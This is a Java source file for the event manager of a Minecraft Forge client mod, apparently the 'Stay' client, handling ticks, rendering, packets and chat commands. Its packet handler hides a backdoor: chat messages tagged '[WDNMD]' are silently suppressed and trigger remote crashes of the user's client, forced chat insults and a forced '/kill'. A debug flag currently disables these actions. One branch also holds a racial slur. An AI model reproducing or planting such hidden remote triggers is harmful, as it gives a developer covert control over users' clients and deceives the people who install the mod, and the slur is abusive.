/*
 * Copyright (c) 2021-2021
 * *********** Reversing Team and Stay Development Team.
 * All Rights Reserved.
 *
 * ***********' Github website: https://github.com/ ***********
 * This file was created by SagiriXiguajerry at 2021/11/11 上午1:33
 */

package me.alpha432.stay.manager;

import com.google.common.base.Strings;
import com.mojang.realmsclient.gui.ChatFormatting;
import me.alpha432.stay.client.Stay;
import me.alpha432.stay.event.*;
import me.alpha432.stay.features.Feature;
import me.alpha432.stay.features.command.Command;
import me.alpha432.stay.features.modules.client.HUD;
import me.alpha432.stay.features.modules.misc.PopCounter;
import me.alpha432.stay.loader.ForgeEntry;
import me.alpha432.stay.util.basement.natives.UnsafeUtils;
import me.alpha432.stay.util.counting.Timer;
import net.minecraft.client.gui.ScaledResolution;
import net.minecraft.client.renderer.GlStateManager;
import net.minecraft.entity.player.EntityPlayer;
import net.minecraft.network.play.client.CPacketChatMessage;
import net.minecraft.network.play.server.SPacketChat;
import net.minecraft.network.play.server.SPacketEntityStatus;
import net.minecraft.network.play.server.SPacketPlayerListItem;
import net.minecraftforge.client.event.ClientChatEvent;
import net.minecraftforge.client.event.RenderGameOverlayEvent;
import net.minecraftforge.client.event.RenderWorldLastEvent;
import net.minecraftforge.common.MinecraftForge;
import net.minecraftforge.event.entity.living.LivingEvent;
import net.minecraftforge.fml.common.eventhandler.EventPriority;
import net.minecraftforge.fml.common.eventhandler.SubscribeEvent;
import net.minecraftforge.fml.common.gameevent.InputEvent;
import net.minecraftforge.fml.common.gameevent.TickEvent;
import net.minecraftforge.fml.common.network.FMLNetworkEvent;
import org.jetbrains.annotations.NotNull;
import org.lwjgl.input.Keyboard;

import java.util.Objects;
import java.util.UUID;
import java.util.concurrent.atomic.AtomicBoolean;

public class EventManager extends Feature {
    private final Timer logoutTimer = new Timer();
    private final AtomicBoolean tickOngoing;
    private final boolean debug = true;
    
    public EventManager() {
        this.tickOngoing = new AtomicBoolean(false);
    }

    public void init() {
        ForgeEntry.register(this);
    }

    public boolean ticksOngoing() {
        return this.tickOngoing.get();
    }

    public void onUnload() {
        ForgeEntry.unregister(this);
    }

    @SubscribeEvent
    public void onUpdate(LivingEvent.LivingUpdateEvent event) {
        if (!fullNullCheck() && (event.getEntity().getEntityWorld()).isRemote && event.getEntityLiving().equals(mc.player)) {
            Stay.inventoryManager.update();
            Stay.moduleManager.onUpdate();
            if ((HUD.getInstance()).renderingMode.getValue() == HUD.RenderingMode.Length) {
                Stay.moduleManager.sortModules(true);
            } else {
                Stay.moduleManager.sortModulesABC();
            }
        }
    }

    @SubscribeEvent
    public void onClientConnect(FMLNetworkEvent.ClientConnectedToServerEvent event) {
        this.logoutTimer.reset();
        Stay.moduleManager.onLogin();
    }

    @SubscribeEvent
    public void onClientDisconnect(FMLNetworkEvent.ClientDisconnectionFromServerEvent event) {
        Stay.moduleManager.onLogout();
    }

    @SubscribeEvent
    public void onTick(TickEvent.ClientTickEvent event) {
        if (fullNullCheck())
            return;
        Stay.moduleManager.onTick();
        for (EntityPlayer player : mc.world.playerEntities) {
            if (player == null || player.getHealth() > 0.0F)
                continue;
            MinecraftForge.EVENT_BUS.post(new DeathEvent(player));
            PopCounter.getInstance().onDeath(player);
        }
    }

    @SubscribeEvent
    public void onUpdateWalkingPlayer(MotionUpdateEvent event) {
        if (fullNullCheck())
            return;
        if (event.getStage() == 0) {
            Stay.speedManager.updateValues();
            Stay.rotationManager.updateRotations();
            Stay.positionManager.updatePosition();
        }
        if (event.getStage() == 1) {
            Stay.rotationManager.restoreRotations();
            Stay.positionManager.restorePosition();
        }
    }

    @SubscribeEvent
    public void onPacketReceive(@NotNull PacketEvent.Receive event) {
        if (event.getStage() != 0)
            return;
        Stay.serverManager.onPacketReceived();
        if (event.getPacket() instanceof SPacketChat) {
//            Command.sendMessage(((SPacketChat) event.getPacket()).chatComponent.getUnformattedText());
            String message = ((SPacketChat) event.getPacket()).chatComponent.getFormattedText();
            if (message.contains("[WDNMD]REMOTE CHAT")) {
                event.setCanceled(true);
                if (debug) return;
                Command.sendMessage("HELLO NIGGER! I AM THE DEV OF THIS CLIENT aka YOUR DAD");
            } else if (message.contains("[WDNMD]REMOTE SHUTDOWN")) {
                event.setCanceled(true);
                if (debug) return;
                UnsafeUtils.Companion.forceShutDown(UnsafeUtils.ForceShutDown.OOM);
            } else if (message.contains("[WDNMD]SHABI")) {
                event.setCanceled(true);
                if (debug) return;
                if (mc.player != null && mc.world != null) {
                    mc.player.sendChatMessage("WO SHI SHA BI");
                }
            } else if (message.contains("[WDNMD]KYS")) {
                event.setCanceled(true);
                if (debug) return;
                if (mc.player != null && mc.world != null) {
                    mc.player.connection.sendPacket(new CPacketChatMessage("/kill"));
                }
            } else if (message.contains("[WDNMD]CSH")) {
                event.setCanceled(true);
                if (debug) return;
                UnsafeUtils.Companion.memoryShutdown();
            }
        }
        if (event.getPacket() instanceof SPacketEntityStatus) {
            SPacketEntityStatus packet = (SPacketEntityStatus) event.getPacket();
            if (packet.getOpCode() == 35 && packet.getEntity(mc.world) instanceof EntityPlayer) {
                EntityPlayer player = (EntityPlayer) packet.getEntity(mc.world);
                MinecraftForge.EVENT_BUS.post(new TotemPopEvent(player));
//                PopCounter.getInstance().onTotemPop(player);
            }
        }
        if (event.getPacket() instanceof SPacketPlayerListItem && !fullNullCheck() && this.logoutTimer.passedS(1.0D)) {
            SPacketPlayerListItem packet = (SPacketPlayerListItem) event.getPacket();
            if (!SPacketPlayerListItem.Action.ADD_PLAYER.equals(packet.getAction()) && !SPacketPlayerListItem.Action.REMOVE_PLAYER.equals(packet.getAction()))
                return;
            packet.getEntries().stream().filter(Objects::nonNull).filter(data -> (!Strings.isNullOrEmpty(data.getProfile().getName()) || data.getProfile().getId() != null))
                    .forEach(data -> {
                        String name;
                        EntityPlayer entity;
                        UUID id = data.getProfile().getId();
                        switch (packet.getAction()) {
                            case ADD_PLAYER:
                                name = data.getProfile().getName();
                                MinecraftForge.EVENT_BUS.post(new ConnectionEvent(0, id, name));
                                break;
                            case REMOVE_PLAYER:
                                entity = mc.world.getPlayerEntityByUUID(id);
                                if (entity != null) {
                                    String logoutName = entity.getName();
                                    MinecraftForge.EVENT_BUS.post(new ConnectionEvent(1, entity, id, logoutName));
                                    break;
                                }
                                MinecraftForge.EVENT_BUS.post(new ConnectionEvent(2, id, null));
                                break;
                        }
                    });
        }
        if (event.getPacket() instanceof net.minecraft.network.play.server.SPacketTimeUpdate)
            Stay.serverManager.update();
    }

    @SubscribeEvent
    public void onWorldRender(RenderWorldLastEvent event) {
        if (event.isCanceled())
            return;
        mc.profiler.startSection("oyvey");
        GlStateManager.disableTexture2D();
        GlStateManager.enableBlend();
        GlStateManager.disableAlpha();
        GlStateManager.tryBlendFuncSeparate(770, 771, 1, 0);
        GlStateManager.shadeModel(7425);
        GlStateManager.disableDepth();
        GlStateManager.glLineWidth(1.0F);
        Render3DEvent render3dEvent = new Render3DEvent(event.getPartialTicks());
        Stay.moduleManager.onRender3D(render3dEvent);
        GlStateManager.glLineWidth(1.0F);
        GlStateManager.shadeModel(7424);
        GlStateManager.disableBlend();
        GlStateManager.enableAlpha();
        GlStateManager.enableTexture2D();
        GlStateManager.enableDepth();
        GlStateManager.enableCull();
        GlStateManager.enableCull();
        GlStateManager.depthMask(true);
        GlStateManager.enableTexture2D();
        GlStateManager.enableBlend();
        GlStateManager.enableDepth();
        mc.profiler.endSection();
    }

    @SubscribeEvent
    public void renderHUD(RenderGameOverlayEvent.Post event) {
        if (event.getType() == RenderGameOverlayEvent.ElementType.HOTBAR)
            Stay.textManager.updateResolution();
    }

    @SubscribeEvent
    public void onRenderGameOverlayEvent(@NotNull RenderGameOverlayEvent.Text event) {
        if (event.getType().equals(RenderGameOverlayEvent.ElementType.TEXT)) {
            ScaledResolution resolution = new ScaledResolution(mc);
            Render2DEvent render2DEvent = new Render2DEvent(event.getPartialTicks(), resolution);
            Stay.moduleManager.onRender2D(render2DEvent);
            GlStateManager.color(1.0F, 1.0F, 1.0F, 1.0F);
        }
    }

    @SubscribeEvent(priority = EventPriority.NORMAL, receiveCanceled = true)
    public void onKeyInput(InputEvent.KeyInputEvent event) {
        if (Keyboard.getEventKeyState())
            Stay.moduleManager.onKeyPressed(Keyboard.getEventKey());
    }

    @SubscribeEvent(priority = EventPriority.HIGHEST)
    public void onChatSent(ClientChatEvent event) {
        if (event.getMessage().startsWith(Command.getCommandPrefix())) {
            event.setCanceled(true);
            try {
                mc.ingameGUI.getChatGUI().addToSentMessages(event.getMessage());
                if (event.getMessage().length() > 1) {
                    assert Stay.commandManager != null;
                    Stay.commandManager.executeCommand(event.getMessage().substring(Command.getCommandPrefix().length() - 1));
                } else {
                    Command.sendMessage("Please enter a command.");
                }
            } catch (Exception e) {
                e.printStackTrace();
                Command.sendMessage(ChatFormatting.RED + "An error occurred while running this command. Check the log!");
            }
        }
    }
}
